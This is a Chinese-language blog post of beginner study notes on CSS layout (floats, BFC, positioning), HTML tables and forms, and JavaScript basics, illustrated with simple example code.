<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>JS学习笔记 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="JS学习笔记" />
<meta property="og:description" content="1. CSS 1.1 文档流 - 所有的元素默认情况下都是在文档流中存在的
- 文档流是网页的最底层
- 元素在文档流中的特点：
- 块元素
1.默认宽度是父元素的全部
2.默认高度被内容（子元素）撑开
3.在页面中自上而下垂直排列
- 内联元素
1.默认高度和宽度都被内容撑开
2.在页面中自左向右水平排列，如果一行不足以容下所有的元素
则换到下一行继续从左向右
1.2 浮动 使用float来设置元素的浮动
- 可选值：
none 默认值，元素不浮动，就在文档流中
left 元素向页面的左侧浮动
right 元素向页面的右侧浮动
- 浮动特点：
1.元素设置浮动以后，会完全脱离文档流，并向页面的左上或右上浮动。
直到遇到父元素的边框或其他的父元素时则停止浮动。
2.如果浮动元素上边是一个没有浮动的块元素，元素不会超过该块元素。
3.浮动元素的浮动位置不能超过他上边浮动的兄弟元素，最多一边齐
4.浮动元素不会覆盖文字，文字会围绕在浮动元素的周围，所以可以通过浮动来实现文字环绕图片的效果。
- 浮动以后元素会完全脱离文档流，脱离文档流以后元素会具有如下特点：
1.块元素不独占一行
2.块元素的宽度和高度都被内容撑开
3.元素不在文档流占用位置
4.内联元素会变成块元素
- 高度塌陷
- 在文档流中元素的高度默认被子元素撑开，当子元素浮动时，子元素会脱离文档流，
此时将不能撑起父元素的高度，会导致父元素的高度塌陷。父元素高度塌陷会导致其他元素的位置上移，导致页面的布局混乱。
- 可以通过开启元素的BFC来处理高度塌陷的问题。
- BFC叫做Block Formatting Context
- 它是一个隐含属性，默认情况是关闭，当开启以后元素会具有如下的特性：
1.父元素的垂直外边距不会和子元素重叠
2.开启BFC的元素不会被浮动元素覆盖
3.父元素可以包含浮动的子元素
- 开启BFC的方式很多：
1.设置元素浮动
2.设置元素绝对定位
3.设置元素为inline-block
4.将元素的overflow设置为一个非默认值
- 一般我们采取副作用比较小的方式
overflow:hidden;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/fcd5d9e2832c16bf6970b6447e07cc68/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-13T10:13:18+08:00" />
<meta property="article:modified_time" content="2023-12-13T10:13:18+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">JS学习笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>1. CSS </h2> 
<h3>1.1 文档流</h3> 
<blockquote> 
 <p>- 所有的元素默认情况下都是在文档流中存在的<br> - 文档流是网页的最底层<br> - 元素在文档流中的特点：<br>     - 块元素<br>         1.默认宽度是父元素的全部<br>         2.默认高度被内容（子元素）撑开<br>         3.在页面中自上而下垂直排列<br>     - 内联元素<br>         1.默认高度和宽度都被内容撑开<br>         2.在页面中自左向右水平排列，如果一行不足以容下所有的元素<br>             则换到下一行继续从左向右</p> 
</blockquote> 
<h3>1.2 浮动</h3> 
<p><strong>使用float来设置元素的浮动</strong></p> 
<blockquote> 
 <p><strong>- 可选值：</strong><br>     none 默认值，元素不浮动，就在文档流中<br>     left 元素向页面的左侧浮动<br>     right 元素向页面的右侧浮动<br><strong>- 浮动特点：</strong><br>     1.元素设置浮动以后，会完全脱离文档流，并向页面的左上或右上浮动。<br>             直到遇到父元素的边框或其他的父元素时则停止浮动。<br>     2.如果浮动元素上边是一个没有浮动的块元素，元素不会超过该块元素。<br>     3.浮动元素的浮动位置不能超过他上边浮动的兄弟元素，最多一边齐<br>     4.浮动元素不会覆盖文字，文字会围绕在浮动元素的周围，所以可以通过浮动来实现文字环绕图片的效果。<br>     <br> - 浮动以后元素会完全脱离文档流，脱离文档流以后元素会具有如下特点：<br>     1.块元素不独占一行<br>     2.块元素的宽度和高度都被内容撑开<br>     3.元素不在文档流占用位置<br>     4.内联元素会变成块元素<br>     <br><strong>- 高度塌陷</strong><br>     - 在文档流中元素的高度默认被子元素撑开，当子元素浮动时，子元素会脱离文档流，<br>         此时将不能撑起父元素的高度，会导致父元素的高度塌陷。父元素高度塌陷会导致其他元素的位置上移，导致页面的布局混乱。<br>     - 可以通过开启元素的BFC来处理高度塌陷的问题。<br>         - BFC叫做Block Formatting Context<br>         - 它是一个隐含属性，默认情况是关闭，当开启以后元素会具有如下的特性：<br>             1.父元素的垂直外边距不会和子元素重叠<br>             2.开启BFC的元素不会被浮动元素覆盖<br>             3.父元素可以包含浮动的子元素<br>         - 开启BFC的方式很多：<br>             1.设置元素浮动<br>             2.设置元素绝对定位<br>             3.设置元素为inline-block<br>             4.将元素的overflow设置为一个非默认值<br>         - 一般我们采取副作用比较小的方式<br>             overflow:hidden;</p> 
</blockquote> 
<h3>1.3 定位</h3> 
<p>通过定位可以将元素摆放到页面的任意位置</p> 
<blockquote> 
 <p><strong>- 使用position来设置元素的定位</strong><br><strong>    - 可选值：</strong><br>         - static 默认值 元素不开启定位<br>         - relative 开启元素的相对定位<br>         - absolute 开启元素的绝对定位<br>         - fixed 开启元素的固定定位<br>         <br><strong>    - 相对定位</strong><br>         1.相对于元素自身在文档流中的位置进行定位<br>         2.相对定位的元素不会脱离文档流，定位元素的性质不会改变，块还是块，内联还是内联<br>         3.如果不设置偏移量，元素不会发生任何的变化<br>         4.会提升元素的层级<br>         <br><strong>    - 绝对定位</strong><br>         1.相对于离它最近的开启了定位的祖先元素进行定位，如果祖先元素都没有开启定位则相对于浏览器窗口进行定位。<br>         2.绝对定位会使元素完全脱离文档流，会改变元素的性质，内联变成块元素，块元素的宽度被内容撑开<br>         3.绝对定位的元素如果不设置偏移量，元素的位置不会发生变化<br>         4.会提升元素的层级<br>         <br><strong>    - 固定定位</strong><br>         - 固定定位也是一种绝对定位，它的大部分特点都和绝对定位是相同的。<br>         - 不同的是：<br>             - 固定定位永远相对于浏览器窗口进行定位<br>             - 固定定位会固定在浏览器的指定的位置，不会随页面一起滚动<br>             <br><strong>    - 偏移量</strong><br>         - 当元素开启了定位以后，可以通过四个偏移量来设置元素的位置<br>             top：相对于定位位置的顶部的偏移量<br>             bottom：相对于定位位置的底部的偏移量<br>             left：相对于定位位置的左侧的偏移量<br>             right：相对于定位位置的右侧的偏移量<br>             <br>         - 一般只需要使用两个值即可给元素进行定位<br>             top left<br>             top right<br>             bottom left<br>             bottom right<br>             <br>         - 偏移量也可以指定一个负值，如果是负值则元素会向相反的方向移动<br>         <br><strong>    - 层级</strong><br>         - 当元素开启定位以后，可以通过z-index来设置层级，<br>             它需要一个正整数作为参数，值越大层级越高，层级越高越优先显示<br>             如果层级一样，则后边的会盖住前边的，父元素永远都不会盖住子元素。<br>             <br>         - 文档流 &lt; 浮动 &lt; 定位    <br>         <br>     - 元素的透明<br>         使用opacity来设置元素的透明度<br>             - 需要一个0-1之间的值<br>             - 0 表示完全透明<br>             - 1 表示完全不透明<br>             <br>         IE8及以下的浏览器不支持该样式，需要使用如下方式来设置<br>             filter:alpha(opacity=透明度);<br>             - 需要一个0-100之间的值<br>             - 0 表示完全透明<br>             - 100 表示完全不透明</p> 
</blockquote> 
<p></p> 
<h2>2. HTML </h2> 
<h3>2.1 表格</h3> 
<p>在网页中可以通过表格来表示一些格式化的数据。</p> 
<blockquote> 
 <p><strong>- 表格相关的标签</strong><br><span style="color:#956fe7;">    - &lt;table&gt; 用来创建一个表格</span><br>     - &lt;tr&gt; 表示表格中的一行<br>     - &lt;th&gt; 表示表头中的单元格<br>     - &lt;td&gt; 表示表格中的单元格<br>         - 属性：<br>             colspan 横向的合并单元格<br>             rowspan 纵向的合并单元格<br>     - 例子：<br>         &lt;table&gt;<br>             &lt;tr&gt;<br>                 &lt;td&gt;&lt;/td&gt;<br>                 &lt;td&gt;&lt;/td&gt;<br>             &lt;/tr&gt;<br>             &lt;tr&gt;<br>                 &lt;td&gt;&lt;/td&gt;<br>                 &lt;td&gt;&lt;/td&gt;<br>             &lt;/tr&gt;<br>         &lt;/table&gt;<br>         <br><strong>    - 长表格</strong><br>         - &lt;thead&gt; 表格的头部<br>         - &lt;tbody&gt; 表格的主体<br>             - 注意：如果表格中没有写thead tbody tfoot，浏览器会自动向table中添加一个tbody<br>                 并且将所有的tr都放到tbody中，tr是tbody的子元素，不是table的子元素<br>         - &lt;tfoot&gt; 表格的底部</p> 
</blockquote> 
<pre><code class="language-html">&lt;!--
	在生活中经常会使用表格来表示一些格式化的数据：比如 ：课程表 银行对账单  人名单
	同样在网页中也可以使用表格来表示一些格式化的数据
	使用table标签来创建一个表格
--&gt;
&lt;table border="1" width="20%" align="center"&gt;
	&lt;!--在table标签中使用tr来表示表格中的一行，有几行就有几个tr--&gt;
	&lt;tr&gt;
		&lt;!--在tr中使用td表示一个单元格，有几个td就有几个单元格--&gt;
		&lt;td&gt;A1&lt;/td&gt;
		&lt;td&gt;A2&lt;/td&gt;
		&lt;td&gt;A3&lt;/td&gt;
		&lt;td&gt;A4&lt;/td&gt;
	&lt;/tr&gt;
	
	&lt;tr&gt;
		&lt;td&gt;B1&lt;/td&gt;
		&lt;td&gt;B2&lt;/td&gt;
		&lt;!--使用rowspan来纵向的合并单元格--&gt;
		&lt;td rowspan="2"&gt;B4&lt;/td&gt;
	&lt;/tr&gt;
	
	&lt;tr&gt;
		&lt;td&gt;C1&lt;/td&gt;
		&lt;td&gt;C2&lt;/td&gt;
		&lt;td&gt;C3&lt;/td&gt;
	&lt;/tr&gt;
	
	&lt;tr&gt;
		&lt;td&gt;D1&lt;/td&gt;
		&lt;td&gt;D2&lt;/td&gt;
		&lt;!-- 使用colspan来横向的合并单元格--&gt;
		&lt;td colspan="2"&gt;D3&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;</code></pre> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;style type="text/css"&gt;
			table{
				/*设置一个宽度*/
				width: 300px;
				/*设置居中*/
				margin: 50px auto;
				/*设置一个边框*/
				/*border: 1px solid black;*/
				/*border-spacing可以用来设置表格边框之间的距离*/
				border-spacing: 100px;
				
				/*
				 * border-collapse可以用来设置表格的边框的合并
				 * 	如果将值设置collapse，则table和td的边框将会自动合并为一个
				 * 	当设置了边框合并以后，border-spacing将自动失效
				 */
				border-collapse: collapse;
			}
			
			td,th{
				/*设置边框*/
				border: 1px solid black;
			}
			
			tbody &gt; tr{
				background-color: #bfa;
			}
			
			
		&lt;/style&gt;
	&lt;/head&gt;
	&lt;body&gt;
		
		&lt;!-- table是一个块元素 --&gt;
		&lt;table&gt;
			&lt;!--
				我们在创建一个表格时，如果没有使用thead tbody tfoot这些标签时，
					浏览器会自动在页面中添加tbody，并且将所有的tr都放到tbody中
					所以实际上tr并不是table子元素，而是tbody的子元素
			--&gt;
			&lt;tr&gt;
				&lt;!--在html中还为我们提供了一个th标签，专门用来表示表头的单元格--&gt;
				&lt;th&gt;学号&lt;/th&gt;
				&lt;th&gt;姓名&lt;/th&gt;
				&lt;th&gt;年龄&lt;/th&gt;
				&lt;th&gt;住址&lt;/th&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td&gt;1&lt;/td&gt;
				&lt;td&gt;孙悟空&lt;/td&gt;
				&lt;td&gt;18&lt;/td&gt;
				&lt;td&gt;花果山&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td&gt;2&lt;/td&gt;
				&lt;td&gt;猪八戒&lt;/td&gt;
				&lt;td&gt;28&lt;/td&gt;
				&lt;td&gt;高老庄&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td&gt;3&lt;/td&gt;
				&lt;td&gt;沙和尚&lt;/td&gt;
				&lt;td&gt;38&lt;/td&gt;
				&lt;td&gt;流沙河&lt;/td&gt;
			&lt;/tr&gt;
		&lt;/table&gt;
		
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<pre><code class="language-html">&lt;table&gt;
	&lt;!-- 
		HTML中还为我们提供了三个标签，用来将表格分成三个部分
		&lt;thead&gt;
		&lt;tbody&gt;
		&lt;tfoot&gt;
			
		我们可以将对应部分的tr，放到指定的标签	
		使用这三个标签创建的表格，在打印时，会在每页都打印表格的头部和底部
			无论编写到什么位置，thead中的内容，永远都会显示在表格的头部
				而tfoot中的内容，永远都会显示在表格的底部
	--&gt;
	
	&lt;!--表格的头部--&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;td&gt;日期&lt;/td&gt;
			&lt;td&gt;收入&lt;/td&gt;
			&lt;td&gt;支出&lt;/td&gt;
			&lt;td&gt;合计&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;!--表格的底部--&gt;
	&lt;tfoot&gt;
		&lt;tr&gt;
			&lt;td&gt;&lt;/td&gt;
			&lt;td&gt;&lt;/td&gt;
			&lt;td&gt;合计&lt;/td&gt;
			&lt;td&gt;300&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tfoot&gt;
	
	&lt;!--表格的主要内容--&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td&gt;16.11.11&lt;/td&gt;
			&lt;td&gt;500&lt;/td&gt;
			&lt;td&gt;300&lt;/td&gt;
			&lt;td&gt;200&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;16.11.11&lt;/td&gt;
			&lt;td&gt;500&lt;/td&gt;
			&lt;td&gt;300&lt;/td&gt;
			&lt;td&gt;200&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;16.11.11&lt;/td&gt;
			&lt;td&gt;500&lt;/td&gt;
			&lt;td&gt;300&lt;/td&gt;
			&lt;td&gt;200&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;</code></pre> 
<pre><code class="language-html">&lt;!--
	在一个表格中也可以嵌套其他的表格
		在很久以前，我们经常使用表格在页面中进行布局，此时就需要使用大量的表格的嵌套
		表格布局，布局起来非常的简单，但是维护起来非常的麻烦，所以现在已经很少有人用
	表格的列数由td最多的那个tr来决定
--&gt;
&lt;table border="1" width="100%"&gt;
	&lt;tr&gt;
		&lt;td height="120" colspan="2"&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td height="400" width="20%"&gt;&lt;/td&gt;
		&lt;td height="400"&gt;
			&lt;table border="1" width="100%" height="100%"&gt;
				&lt;tr&gt;
					&lt;td&gt;&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;&lt;/td&gt;
				&lt;/tr&gt;
			&lt;/table&gt;
		&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td height="120" colspan="2"&gt;&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;</code></pre> 
<h3>2.2 表单</h3> 
<p>表单可以将用户的信息提交到服务器中。</p> 
<blockquote> 
 <p><strong>- &lt;form&gt;<br>     - 用来创建一个表单</strong><br>     - 属性：<br>         action:需要一个服务器地址，提交表单时表单中的内容将会被提交到该地址<br><strong>- 表单项</strong><br><span style="color:#ed7976;"><strong>    - &lt;input /&gt;</strong><br>         - 它可以根据不同的type属性值，生成不同的表单项<br>         - type="text" 文本框 &lt;input type="text" name="" /&gt;<br>         - type="password" 密码框 &lt;input type="password" name="" /&gt;<br>         - type="radio" 单选按钮 &lt;input type="radio" name="" value="" checked="checked" /&gt;<br>         - type="checkbox" 多选框 &lt;input type="checkbox" name="" value="" checked="checked" /&gt;<br>         - type="submit"  提交按钮 &lt;input type="submit" value="按钮上的文字" /&gt;<br>         - type="reset"  重置按钮 &lt;input type="reset" value="按钮上的文字" /&gt;<br>         - type="button" 普通按钮 &lt;input type="button" value="按钮上的文字" /&gt; </span><br>         <br><strong>    - &lt;select&gt;</strong><br>         - 下拉列表<br>         - &lt;select name=""&gt;<br>                 &lt;option value="" selected="selected"&gt;&lt;/option&gt;<br>                 &lt;option value=""&gt; &lt;/option&gt;<br>                 &lt;option value=""&gt;&lt;/option&gt;<br>             &lt;/select&gt;<br>     <br><strong>    - &lt;button&gt;</strong><br>         - 按钮功能input那几个按钮一样，但是它们要灵活一些<br>             &lt;button type="submit"&gt;按钮的文字&lt;/button&gt;<br>             &lt;button type="reset"&gt;按钮的文字&lt;/button&gt;<br>             &lt;button type="button"&gt;按钮的文字&lt;/button&gt;</p> 
</blockquote> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;!-- 使用form标签来创建一个表单，form中有一个必须的属性叫做action，
			action需要一个服务器的地址，当我们提交表单时，填写的内容将会提交到action指向的地址 --&gt;

		&lt;form action="target.html"&gt;
			&lt;!-- 在form中可以创建一个表单项，用户可以通过表单项来填写信息 --&gt;
			&lt;!--  文本框
				  使用input标签来创建一个文本框，它需要一个type属性是text
				- 如果希望表单中的内容最终发送到服务器，还必须要给表单项添加一个name属性
					该属性将会作为用户填写内容名字，在服务器中可以根据这个名字来获取用户填写内容
					
				- 默认情况下，用户添加的内容将会以查询字符串的形式发送给服务器，
					所谓的查询字符串就是url地址?后边的内容
				- username=sunwukong&amp;password=123123
				- 查询字符实际上就是一个一个的名值对结构，多个名值对之间使用&amp;隔开
					一个名字 = 一个值
					名字就是表单项指定的name属性值
					值就是用户填写的内容，在服务器中可以通过名字来获取用户填写的内容
					
					可以通过value属性为文本框指定一个默认值！！ --&gt;
			用户名 &lt;input type="text" name="username" value="hello" /&gt; &lt;br /&gt;&lt;br /&gt;
			
			&lt;!-- 密码框也是input，不同的是它type需要使用password --&gt;
			密码 &lt;input type="password" name="password" /&gt; &lt;br /&gt;&lt;br /&gt;
			
			&lt;!--
				单选按钮
				 - 使用input来创建一个单选按钮，它的type属性值是radio
				 - 单选按钮是通过name属性来分组的，相同的name属性值属于一组！
				 - 像这种选择框不需要用户填写内容的，还必须指定一个value属性，
				 	这样选中的元素的value属性值将会被提交到服务器
				 - 如果希望某个单选按钮处在默认选中的状态可以在标签中添加属性 checked="checked"  --&gt;
			性别 &lt;input type="radio" name="gender" value="male" /&gt;男  
				&lt;input type="radio" name="gender" value="female" checked="checked" /&gt;女
			&lt;br /&gt;&lt;br /&gt;
			
			&lt;!-- 多选框
				- 使用input来创建一个多选框
				- 它的type属性是checkbox --&gt;
			爱好 &lt;input type="checkbox" name="hobby" value="ppq" /&gt;乒乓球
				&lt;input type="checkbox" name="hobby" value="ymq" checked="checked" /&gt;羽毛球
				&lt;input type="checkbox" name="hobby" value="lq" /&gt;篮球
				
				&lt;br /&gt;&lt;br /&gt;
				
			&lt;!-- 下拉列表
				- 使用select来创建一个下拉列表
				- 使用option标签来创建下拉列表中的选项
				- 下拉列表的name属性需要指定给select标签，value属性需要指定给option
				- 如果希望将option设置为默认选中，则可以在option中添加一个属性 selected = "selected"  --&gt;
			你最喜欢的明星
						&lt;select name="star"&gt;
							&lt;option value="fbb"&gt;范冰冰&lt;/option&gt;
							&lt;option value="zw" &gt;赵薇&lt;/option&gt;
							&lt;option value="lxr" selected="selected"&gt;林心如&lt;/option&gt;
						&lt;/select&gt;
			
			&lt;br /&gt;&lt;br /&gt;
			
			&lt;!--  提交按钮
					- 使用input来创建一个提交按钮
					- 它的type叫做submit
					- 通过value属性可以设置提交按钮上的文字
			--&gt;
			&lt;input type="submit" value="注册" /&gt;
			
			&lt;!--
				重置按钮
					重置按钮可以使表单恢复到默认值
			--&gt;
			&lt;input type="reset" /&gt;
			
			&lt;!--
				如果type设置为button，那么会生成一个普通的按钮，
				它只有一个功能就是被点
			--&gt;
			&lt;input type="button" value="按钮" /&gt;
			
			&lt;br /&gt;&lt;br /&gt;
			
			&lt;!--
				也可以通过button标签来创建按钮
					使用button创建的按钮和input创建的按钮功能一致，
					只不过button标签更加的灵活
			--&gt;
			&lt;button type="submit"&gt;提交按钮&lt;/button&gt;
			&lt;button type="reset"&gt;重置&lt;/button&gt;
			&lt;button type="button"&gt;单纯的按钮&lt;/button&gt;
			
		&lt;/form&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<h2>3. JS</h2> 
<h3>3.1 JS 基础</h3> 
<p>JavaScript 负责页面中的的行为。它是一门运行在浏览器端的脚本语言。</p> 
<h4>1）JS 的编写的位置</h4> 
<p>① 可以编写到标签的指定属性中</p> 
<pre><code class="language-javascript">			&lt;button onclick="alert('hello');"&gt;我是按钮&lt;/button&gt;
			&lt;a href="javascript:alert('aaa');"&gt;超链接&lt;/a&gt;</code></pre> 
<p>② 可以编写到script标签中</p> 
<pre><code class="language-javascript">			&lt;script type="text/javascript"&gt;
				//编写js代码
			&lt;/script&gt;</code></pre> 
<p>③ 可以将代码编写到外部的js文件中，然后通过标签将其引入</p> 
<pre><code class="language-javascript">			&lt;script type="text/javascript" src="文件路径"&gt;&lt;/script&gt;</code></pre> 
<pre><code class="language-html">​
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		
		&lt;!--
			1. 可以将js代码编写到外部js文件中，然后通过script标签引入
			写到外部文件中可以在不同的页面中同时引用，也可以利用到浏览器的缓存机制
			推荐使用的方式
		--&gt;
		&lt;script type="text/javascript" src="js/script.js"&gt;&lt;/script&gt;
		&lt;!--
			script标签一旦用于引入外部文件了，就不能在编写代码了，即使编写了浏览器也会忽略
			如果需要则可以在创建一个新的script标签用于编写内部代码
		--&gt;
		&lt;script type="text/javascript"&gt;
			alert("我是内部的JS代码");
		&lt;/script&gt;
		
		&lt;!--
			2. 可以将js代码编写到script标签	
		&lt;script type="text/javascript"&gt;
			alert("我是script标签中的代码！！");
		&lt;/script&gt;
		--&gt;
	&lt;/head&gt;
	&lt;body&gt;
		
		&lt;!--
			3. 可以将js代码编写到标签的onclick属性中
			当我们点击按钮时，js代码才会执行
			
			虽然可以写在标签的属性中，但是他们属于结构与行为耦合，不方便维护，不推荐使用
		--&gt;
		&lt;button onclick="alert('讨厌，你点我干嘛~~');"&gt;点我一下&lt;/button&gt;
		
		&lt;!--
			4. 可以将js代码写在超链接的href属性中，这样当点击超链接时，会执行js代码
		--&gt;
		&lt;a href="javascript:alert('让你点你就点！！');"&gt;你也点我一下&lt;/a&gt;
		&lt;a href="javascript:;"&gt;你也点我一下&lt;/a&gt;
		
	&lt;/body&gt;
&lt;/html&gt;

​</code></pre> 
<h4>2）输出语句</h4> 
<p>① alert("要输出的内容");  //该语句会在浏览器窗口中弹出一个警告框</p> 
<p>② document.write("要输出的内容"); //该内容将会被写到body标签中，并在页面中显示</p> 
<p>③ console.log("要输出的内容"); //该内容会被写到开发者工具的控制台中</p> 
<pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;!--JS代码需要编写到script标签中--&gt;
		&lt;script type="text/javascript"&gt;
			
			/*
			 * 控制浏览器弹出一个警告框
			 */
			alert("哥，你真帅啊！！");
			
			/*
			 * 让计算机在页面中输出一个内容 
			 * document.write()可以向body中输出一个内容
			 */
			document.write("看我出不出来~~~");
			
			/*
			 * 向控制台输出一个内容
			 * console.log()的作用是向控制台输出一个内容
			 */
			console.log("你猜我在哪出来呢？");
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<h4>3）基础语法</h4> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 	多行注释
			 	JS注释
			 	多行注释，注释中的内容不会被执行，但是可以在源代码中查看
			 		要养成良好的编写注释的习惯，也可以通过注释来对代码进行一些简单的调试
			 */
			
			//单行注释
			//alert("hello");
			//document.write("hello");
			console.log("hello"); //该语句用来在控制台输出一个日志
			
			/*
			 * 1.JS中严格区分大小写
			 * 2.JS中每一条语句以分号(;)结尾
			 * 		- 如果不写分号，浏览器会自动添加，但是会消耗一些系统资源，
			 * 			而且有些时候，浏览器会加错分号，所以在开发中分号必须写
			 * 3.JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化
			 * 
			 */
			alert("hello");
		&lt;/script&gt;</code></pre> 
<h4>4）字面量和变量</h4> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 * 字面量，都是一些不可改变的值
			 * 		比如 ：1 2 3 4 5 
			 * 		字面量都是可以直接使用，但是我们一般都不会直接使用字面量
			 * 
			 * 变量    变量可以用来保存字面量，而且变量的值是可以任意改变的
			 * 		变量更加方便我们使用，所以在开发中都是通过变量去保存一个字面量，
			 * 		而很少直接使用字面量
			 * 		可以通过变量对字面量进行描述
			 */
			
			//声明变量
			//在js中使用var关键字来声明一个变量
			var a;
			
			//为变量赋值
			a = 123;
			a = 456;
			a = 123124223423424;
			
			//声明和赋值同时进行
			var b = 789;
			var c = 0;
			
			var age = 80;
			
			console.log(age);
			
		&lt;/script&gt;</code></pre> 
<h4>5）标识符</h4> 
<p>在JS中所有的可以自主命名的内容，都可以认为是一个标识符，是标识符就应该遵守标识符的规范。比如：变量名、函数名、属性名。</p> 
<p><strong>规范：</strong></p> 
<ul><li>标识符中可以含有字母、数字、_、$</li><li>标识符不能以数字开头</li><li>标识符不能是JS中的关键字和保留字</li><li>标识符一般采用驼峰命名法</li></ul> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 * 标识符
			 * 	- 在JS中所有的可以由我们自主命名的都可以称为是标识符
			 * 	- 例如：变量名、函数名、属性名都属于标识符
			 * 	- 命名一个标识符时需要遵守如下的规则：
			 * 		1.标识符中可以含有字母、数字、_、$
			 * 		2.标识符不能以数字开头
			 * 		3.标识符不能是JS中的关键字或保留字
			 * 		4.标识符一般都采用驼峰命名法
			 * 			- 首字母小写，每个单词的开头字母大写，其余字母小写
			 * 			helloWorld xxxYyyZzz
			 * 
			 * 	- JS底层保存标识符时实际上是采用的Unicode编码，
			 * 		所以理论上讲，所有的utf-8中含有的内容都可以作为标识符
			 */
			/*var if = 123;
			
			console.log(if);*/
			
			
			//千万不要这么用
			var 锄禾日当午 = 789;
			console.log(锄禾日当午);

		&lt;/script&gt;</code></pre> 
<h3>3.2 数据类型</h3> 
<h4>1）数据类型</h4> 
<p>JS 中一共分成六种数据类型：</p> 
<ul><li><span style="color:#956fe7;">String 字符串</span></li><li><span style="color:#956fe7;">Number 数值</span></li><li><span style="color:#956fe7;">Boolean 布尔值</span></li><li><span style="color:#956fe7;">Null 空值</span></li><li><span style="color:#956fe7;">Undefined 未定义</span></li><li><span style="color:#956fe7;">Object 对象</span></li></ul> 
<p><strong>① 其中基本数据类型有：</strong></p> 
<blockquote> 
 <p><strong>        - String 字符串</strong><br>             - JS中的字符串需要使用引号引起来双引号或单引号都行<br>             - 在字符串中使用\作为转义字符<br>                 \'  ==&gt; '<br>                 \"  ==&gt; "<br>                 \n  ==&gt; 换行<br>                 \t  ==&gt; 制表符<br>                 \\  ==&gt; \    <br>                 <br>             - 使用typeof运算符检查字符串时，会返回"string"    </p> 
</blockquote> 
<blockquote> 
 <p><strong>        - Number 数值</strong><br>             - JS中所有的整数和浮点数都是Number类型<br>             - 特殊的数字<br>                 Infinity 正无穷<br>                 -Infinity 负无穷<br>                 NaN 非法数字（Not A Number）<br>             - 其他进制的数字的表示：<br>                 0b 开头表示二进制，但是不是所有的浏览器都支持<br>                 0 开头表示八进制<br>                 0x 开头表示十六进制<br>                 <br>             - 使用typeof检查一个Number类型的数据时，会返回"number"<br>                 （包括NaN 和 Infinity）</p> 
</blockquote> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			/*
			 * 在JS中所有的数值都是Number类型，
			 * 	包括整数和浮点数（小数）
			 * 
			 * JS中可以表示的数字的最大值
			 * 	Number.MAX_VALUE
			 * 		1.7976931348623157e+308
			 * 
			 * 	Number.MIN_VALUE 大于0的最小值
			 * 		5e-324
			 * 
			 *  如果使用Number表示的数字超过了最大值，则会返回一个
			 * 		Infinity 表示正无穷
			 * 		-Infinity 表示负无穷
			 * 		使用typeof检查Infinity也会返回number
			 *  NaN 是一个特殊的数字，表示Not A Number
			 * 		使用typeof检查一个NaN也会返回number
			 */
			//数字123
			var a = 123;
			//字符串123
			var b = "123";
			/*
			 	可以使用一个运算符 typeof
			 		来检查一个变量的类型
			 	语法：typeof 变量	
			 	检查字符串时，会返回string
			 	检查数值时，会返回number
			 * */
			//console.log(typeof b);
			
			a = -Number.MAX_VALUE * Number.MAX_VALUE;
			a = "abc" * "bcd";
			a = NaN;
			//console.log(typeof a);
			
